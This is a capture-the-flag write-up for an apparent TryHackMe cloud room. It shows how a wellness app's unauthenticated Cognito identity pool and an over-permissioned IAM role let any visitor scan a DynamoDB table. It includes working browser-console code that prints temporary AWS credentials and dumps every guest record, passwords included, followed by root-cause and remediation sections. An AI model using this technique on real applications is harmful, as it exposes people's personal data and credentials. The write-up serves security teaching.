# TryHackMe: Concierge Briefing — Byte Lotus Wellness (Cloud / Easy)

**Category:** Cloud
**Difficulty:** Easy
**Points:** 60
**Flag:** `THM{fr33_app_fr33_d4t4!}`

---

## Challenge Brief

> Lambo installed the Byte Lotus Wellness app the day she arrived — free, well-reviewed (by the app itself), no account, no login screen. It just knows things about you the moment you open it.
>
> Objective: find out how the app knows anything about you at all, and see what else it's willing to hand over.

**Target:**
```
http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

The room's itinerary laid out the intended path:

1. Track down the AWS mechanism issuing credentials behind the scenes.
2. Use those credentials to dump more than your own record from the app's DynamoDB table.
3. Retrieve the flag from another guest's data.

---

## Recon

The target is a static site hosted on an S3 website bucket:

```
$ curl -s http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

Response was a minimal HTML page — a "wellness dashboard" that loads the AWS SDK and a bundled `app.js`:

```html
<script src="https://sdk.amazonaws.com/js/aws-sdk-2.1500.0.min.js"></script>
<script src="app.js"></script>
```

No login form, no account creation — consistent with the brief. The interesting logic had to be in `app.js`.

## Source Review — `app.js`

Pulling `app.js` revealed the full client-side flow:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});

function guestId() {
  let id = localStorage.getItem("byteLotusGuestId");
  if (!id) {
    id = "guest-" + Math.random().toString(36).slice(2, 10);
    localStorage.setItem("byteLotusGuestId", id);
  }
  return id;
}

AWS.config.credentials.get(function (err) {
  const dynamodb = new AWS.DynamoDB({ region: AWS_REGION });
  dynamodb.getItem(
    { TableName: TABLE_NAME, Key: { guest_id: { S: guestId() } } },
    function (err, data) { renderDashboard(data.Item); }
  );
});
```

This confirmed the mechanism behind the "no login, but it knows things about you" pitch: the app calls a **Cognito Identity Pool** to hand out temporary AWS credentials to any anonymous visitor, then uses those credentials to `getItem` a single DynamoDB record keyed by a client-generated `guest_id` stored in `localStorage`.

Two things stood out immediately:

- The identity pool is **unauthenticated** — no sign-in provider, no token exchange, just a public pool ID embedded in client-side JS.
- The app's own code only ever performs a scoped `GetItem` on the caller's own key. But that's a *client-side* choice, not an enforced boundary — nothing indicated the underlying IAM role was actually restricted to that access pattern.

## Exploitation

In the browser console on the target page (reusing the SDK already loaded and configured), I fetched the temporary credentials directly and issued a `Scan` instead of the app's intended `GetItem`:

```javascript
AWS.config.credentials.get(function (err) {
  console.log("AccessKeyId:", AWS.config.credentials.accessKeyId);
  console.log("SecretAccessKey:", AWS.config.credentials.secretAccessKey);
  console.log("SessionToken:", AWS.config.credentials.sessionToken);

  const dynamodb = new AWS.DynamoDB({ region: "us-east-1" });
  dynamodb.scan({ TableName: "complimentary-GuestWellnessProfiles" }, function (err, data) {
    console.log(err || JSON.stringify(data, null, 2));
  });
});
```

The unauthenticated guest role had `dynamodb:Scan` permission on the full table — `Scan` succeeded and returned **every guest record**, not just mine:

```json
{
  "Items": [
    { "guest_id": {"S": "guest-vibe"},     "name": {"S": "Vibe (Move Fast & Break Things)"}, "password": {"S": "digitaldetox2026"}, "..." },
    { "guest_id": {"S": "guest-lambo"},    "name": {"S": "Lambo (@0xMia)"},                  "password": {"S": "sunkissed88"},      "..." },
    { "guest_id": {"S": "guest-vip-042"},  "name": {"S": "Guest VIP-042"},                   "password": {"S": "escalation_only"},  "..." },
    { "guest_id": {"S": "guest-patch"},    "name": {"S": "Patch (Have You Tried Turning It Off)"}, "..." },
    { "guest_id": {"S": "guest-ponzi"},    "name": {"S": "Ponzi (Satoshi_Probably)"},        "..." }
  ],
  "Count": 5,
  "ScannedCount": 5
}
```

Guest `guest-vip-042`'s `notes` field contained the flag directly:

```
"notes": {
  "S": "If you're reading this, the wellness app's guest role can read every
        profile, not just its own. THM{fr33_app_fr33_d4t4!}"
}
```

**Flag:** `THM{fr33_app_fr33_d4t4!}`

Also incidentally exposed for every guest: full name, email, phone number, GPS coordinates, and a plaintext `password` field — none of which the app itself ever displays, but all readable with the same "free" credentials.

---

## Root Cause

- **Unauthenticated Cognito Identity Pool** issues real, usable STS credentials to any anonymous client — no login, no gating, pool ID sitting in public JS.
- **Over-permissioned IAM role** attached to the unauth identity grants `dynamodb:Scan` on the entire table, rather than being scoped to per-caller, per-item access.
- **No row-level authorization**: nothing ties the issued identity to the `guest_id` partition key (e.g., no IAM policy condition using `dynamodb:LeadingKeys` / `cognito-identity.amazonaws.com:sub`), so there's no server-side enforcement matching the client's intended "only my record" behavior.
- **Client-side intent is not a security boundary.** The frontend only calls `GetItem`, but that's a UX choice baked into `app.js` — any caller holding the same credentials can issue any DynamoDB API call the IAM policy allows.

## Remediation

- Scope the unauthenticated role's IAM policy to `dynamodb:GetItem` / `Query` only, with a `dynamodb:LeadingKeys` condition tying access to the caller's own Cognito identity ID — never grant `Scan` to an unauth role.
- Prefer authenticated (even lightweight, anonymous-but-tracked) Cognito identities over fully unauthenticated pools when the app needs per-user data isolation.
- Never store plaintext passwords in a client-reachable table, regardless of IAM scoping — hash and keep credentials out of guest-facing data stores entirely.
- Treat every permission attached to an unauthenticated Cognito role as effectively public and audit accordingly; assume any client-side "we only fetch our own record" logic will be bypassed.

## Key Takeaway

"Free, no login" access still requires *something* to authorize requests — in this case a Cognito unauthenticated identity pool. Unauthenticated ≠ unprivileged: the temporary credentials it hands out are real AWS credentials, and their blast radius is defined entirely by the attached IAM policy, not by what the frontend code happens to call. This is a real-world-relevant pattern that shows up repeatedly in cloud bug bounty reports involving public Cognito identity pools.
